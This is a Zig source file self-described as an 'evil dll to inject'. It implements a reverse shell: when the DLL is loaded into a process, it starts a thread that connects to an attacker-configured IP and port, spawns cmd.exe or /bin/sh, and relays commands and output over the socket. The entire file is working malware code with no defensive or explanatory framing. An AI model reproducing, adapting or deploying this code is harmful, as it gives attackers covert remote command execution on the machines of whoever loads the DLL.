//! Evil dll to inject
const std = @import("std");
const builtin = @import("builtin");
const win = @import("win");
const options = @import("reverse_shell_options");

const posix = std.posix;
const net = std.net;
const windows = std.os.windows;

pub fn DllMain(
    hinstDLL: std.os.windows.HINSTANCE,
    fdwReason: std.os.windows.DWORD,
    lpvReserved: std.os.windows.LPVOID,
) callconv(.c) std.os.windows.BOOL {
    _ = lpvReserved;

    if (fdwReason != win.system.system_services.DLL_PROCESS_ATTACH) {
        return win.TRUE;
    }

    const handle_main_thread = win.threads.CreateThread(
        null,
        0,
        win32MainThreadEntrypoint,
        hinstDLL,
        win.threads.THREAD_CREATION_FLAGS{},
        null,
    ) orelse {
        _ = win.system.library_loader.FreeLibrary(@ptrCast(hinstDLL));
        return win.FALSE;
    };

    if (win.standard.CloseHandle(handle_main_thread) == win.FALSE) {
        return win.FALSE;
    }

    return win.TRUE;
}

fn win32MainThreadEntrypoint(param: ?std.os.windows.LPVOID) callconv(.c) std.os.windows.DWORD {
    win.system.library_loader.FreeLibraryAndExitThread(@ptrCast(@alignCast(param)), win32MainThread());
    unreachable;
}

fn win32MainThread() std.os.windows.DWORD {
    var gpa = std.heap.GeneralPurposeAllocator(.{}).init;
    const allocator = gpa.allocator();

    var shell: []const []const u8 = undefined;

    if (builtin.os.tag == .windows) {
        shell = &[_][]const u8{"cmd.exe"};
    } else if ((builtin.os.tag == .linux) or (builtin.os.tag == .macos)) {
        shell = &[_][]const u8{"/bin/sh"};
    } else {
        _ = win.ui.windows_and_messaging.MessageBoxA(null, "Cannot detect target OS", "Shell Selection", win.ui.windows_and_messaging.MB_ICONEXCLAMATION);
        return;
    }

    // connection
    const ipv4 = options.ipv4;
    const port = options.port;
    const address = std.net.Address.parseIp(ipv4, port) catch |err| switch (err) {
        else => {
            return 1;
        },
    };
    const socket = posix.socket(address.any.family, posix.SOCK.STREAM, posix.IPPROTO.TCP) catch |err| switch (err) {
        else => {
            return 1;
        },
    };
    defer posix.close(socket);

    posix.connect(socket, &address.any, address.getOsSockLen()) catch |err| switch (err) {
        else => {
            return 1;
        },
    };

    var process = std.process.Child.init(shell, allocator);
    process.stdin_behavior = .Pipe;
    process.stdout_behavior = .Pipe;
    process.stderr_behavior = .Pipe;
    process.spawn() catch |err| switch (err) {
        else => {
            _ = win.ui.windows_and_messaging.MessageBoxA(null, "Error during process.", "Process", win.ui.windows_and_messaging.MB_ICONEXCLAMATION);
            return 1;
        },
    };

    defer _ = process.kill() catch {};
    var buffer: [4096]u8 = undefined;

    while (true) {
        const bytes_read = socketRecv(socket, &buffer) catch |err| switch (err) {
            else => {
                return 1;
            },
        };

        if (bytes_read == 0) {
            _ = win.ui.windows_and_messaging.MessageBoxA(null, "No bytes read from socket, breaking loop.", "Socket Read", win.ui.windows_and_messaging.MB_ICONEXCLAMATION);
            break;
        }

        _ = process.stdin.?.write(buffer[0..bytes_read]) catch {
            _ = win.ui.windows_and_messaging.MessageBoxA(null, "Error writing to process stdin.", "Process Stdin", win.ui.windows_and_messaging.MB_ICONEXCLAMATION);
            break;
        };

        // Wait for execution
        std.Thread.sleep(300 * std.time.ns_per_ms);

        if (process.stdout.?.read(&buffer)) |output_len| {
            if (output_len > 0) {
                socketSend(socket, buffer[0..output_len]) catch |err| switch (err) {
                    else => {
                        return 1;
                    },
                };
            }
        } else |_| {
            if (process.stderr.?.read(&buffer)) |error_len| {
                if (error_len > 0) {
                    socketSend(socket, buffer[0..error_len]) catch |err| switch (err) {
                        else => {
                            return 1;
                        },
                    };
                }
            } else |_| {
                _ = win.ui.windows_and_messaging.MessageBoxA(null, "Error reading from process stderr.", "Process Stderr", win.ui.windows_and_messaging.MB_ICONEXCLAMATION);
            }
        }
    }

    return 0;
}

// Cross-platform socket receive function
fn socketRecv(socket: posix.socket_t, buffer: []u8) !usize {
    if (builtin.os.tag == .windows) {
        // Use win api because posix is broken on zig 0.15.1
        const result = windows.ws2_32.recv(socket, buffer.ptr, @intCast(buffer.len), 0);
        if (result == windows.ws2_32.SOCKET_ERROR) {
            const err = windows.ws2_32.WSAGetLastError();
            return windows.unexpectedWSAError(err);
        }
        return @intCast(result);
    } else {
        return posix.recv(socket, buffer, 0);
    }
}

// Cross-platform socket send function
fn socketSend(socket: posix.socket_t, data: []const u8) !void {
    var pos: usize = 0;
    while (pos < data.len) {
        const bytes_sent = if (builtin.os.tag == .windows) blk: {
            // Use win api because posix is broken on zig 0.15.1
            const result = windows.ws2_32.send(socket, data[pos..].ptr, @intCast(data.len - pos), 0);
            if (result == windows.ws2_32.SOCKET_ERROR) {
                const err = windows.ws2_32.WSAGetLastError();
                return windows.unexpectedWSAError(err);
            }
            break :blk @as(usize, @intCast(result));
        } else blk: {
            break :blk posix.send(socket, data[pos..], 0) catch |err| switch (err) {
                else => {
                    break :blk @as(usize, @intCast(0));
                },
            };
        };

        if (bytes_sent == 0) return error.Closed;
        pos += bytes_sent;
    }
}
